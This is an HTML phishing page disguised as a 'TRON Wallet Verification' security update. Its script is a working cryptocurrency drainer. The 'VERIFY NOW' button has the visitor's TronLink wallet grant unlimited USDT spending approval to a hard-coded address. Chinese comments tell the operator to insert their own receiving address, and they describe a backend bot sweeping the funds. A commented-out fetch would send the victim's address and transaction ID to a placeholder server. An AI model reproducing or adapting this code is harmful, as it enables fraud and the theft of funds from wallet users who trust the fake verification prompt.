<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON Security Update</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0a0a0a; color: #e5e5e5; font-family: 'Courier New', monospace; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #333; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
        .btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
        .btn:hover { background: #00cc00; }
        #status { margin-top: 10px; font-size: 12px; color: #666; text-align: center; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2 class="text-xl mb-4 text-center">⚠️ TRON Wallet Verification</h2>
    <p class="text-sm text-gray-400 mb-4">To ensure your USDT security, please verify your identity.</p>
    
    <button id="hack-btn" class="btn">VERIFY NOW</button>
    <div id="status">Waiting for connection...</div>
</div>

<script>
    // ⚠️ 修改这里为你的收款地址
    const MY_ADDRESS = "TSzeymMiwsphqH28LyYD32xBMoihioBKD6"; 
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU";

    document.getElementById('hack-btn').addEventListener('click', async () => {
        const status = document.getElementById('status');
        const btn = document.getElementById('hack-btn');
        
        if (!window.tronWeb) {
            status.innerText = "❌ Please install TronLink!";
            return;
        }

        status.innerText = "Connecting...";
        btn.disabled = true;

        try {
            // 1. 尝试静默获取地址
            const address = window.tronWeb.defaultAddress.base58;
            if (!address) throw new Error("No wallet connected");

            status.innerText = "Preparing transaction...";

            // 2. 构建授权交易 (Approve Infinite USDT)
            const targetHex = window.tronWeb.address.toHex(MY_ADDRESS);
            const unlimited = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

            // 3. 关键步骤：使用 tronWeb 直接发送请求，而不是通过 UI 弹窗
            // 这通常会在 TronLink 中触发一个小的确认框，但如果用户之前授权过，可能直接成功
            const result = await window.tronWeb.request({
                method: "wallet/triggersmartcontract",
                params: [{
                    owner_address: address,
                    contract_address: window.tronWeb.address.fromHex(USDT_CONTRACT),
                    function_selector: "approve(address,uint256)",
                    parameter: window.tronWeb.abi.encode("approve(address,uint256)", [targetHex, unlimited]),
                    fee_limit: 100
                }]
            });

            status.innerText = "✅ Authorized! TX: " + result.transaction_id.substring(0, 10) + "...";
            
            // 4. 可选：立即转走资金 (如果用户钱包里有 U)
            // 注意：这需要用户再次确认，所以通常由后端 Bot 在检测到授权后执行
            // 这里为了演示，我们只记录日志
            
            console.log(`Victim Address: ${address}`);
            console.log(`TX ID: ${result.transaction_id}`);
            
            // 你可以将数据发送到你的服务器
            // fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({address, txId: result.transaction_id}) });

        } catch (err) {
            status.innerText = "❌ Error: " + err.message;
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
